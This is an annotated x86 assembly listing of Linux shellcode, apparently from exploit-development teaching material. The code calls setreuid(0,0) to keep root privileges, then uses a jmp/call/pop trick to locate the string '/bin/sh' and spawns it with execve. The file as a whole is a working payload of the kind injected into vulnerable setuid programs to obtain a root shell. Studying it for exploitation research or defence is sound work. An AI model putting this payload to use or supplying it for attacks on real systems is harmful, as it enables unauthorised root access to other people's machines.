BITS 32

;; setreuid(uid_t ruid, uid_t euid)
	
  xor eax, eax      ; first eax must be 0 for the next instruction
  mov al, 70        ; setreuid is system call 70
  xor ebx, ebx      ; set ruid to 0
  xor ecx, ecx      ; set euid to 0
  int 0x80          ; call the kernel

	
;; get the address of the string by jumping to an instruction
;; above it, performing a subrouting call there, then collecting
;; the return address off the stack.

  jmp short two     ; jump to beginning of data area
	
one:
  pop ebx           ; put the address of the string into ebx

	
;; execve(const char *filename, char *const argv [], char *const envp[])
	
  xor eax, eax      ; put 0 into eax
  mov [ebx+7], al   ; put 0 into the data where the X is
  mov [ebx+8], ebx  ; replace AAAA with address of string
  mov [ebx+12], eax ; replace BBBB with NULL pointer
  mov al, 11        ; execve is system call 11
  lea ecx, [ebx+8]  ; set argv to location of AAAA
  lea edx, [ebx+12] ; set envp to location of BBBB
  int 0x80          ; call the kernel


;; data area consisting of the path to the shell, then room
;; for argv (two string pointers) and envp (one pointer)

two:
  call one          ; push address of data on stack and go to one
  db '/bin/shXAAAABBBB'


